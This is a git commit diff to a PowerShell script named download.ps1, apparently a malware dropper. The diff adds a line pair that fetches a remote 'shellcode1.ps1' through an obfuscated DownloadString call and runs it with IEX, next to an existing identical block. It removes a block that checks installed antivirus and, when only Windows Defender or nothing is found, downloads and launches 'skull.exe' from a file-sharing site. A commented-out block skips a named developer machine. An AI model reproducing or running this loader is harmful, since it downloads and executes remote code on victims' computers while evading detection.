2ad6c4338aa907be5cef0a8ae2062cc7f4efdc8f
43a1723 <hai1723notgay@gmail.com>
2024-08-07 20:48:46 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -57,21 +57,12 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellc
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode1.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
 # if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
 #     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
 #     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
 #     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 # }
-
-
-
-
-$temp = "$temp\skull.exe"; 
-$av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
-if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
-    if (-not (Test-Path $temp)) { 
-        Invoke-WebRequest "https://anonsharing.com/file/6588f00960e4d27f/a_(3).exe" -OutFile $temp 
-    } 
-    Start-Process $temp 
-}
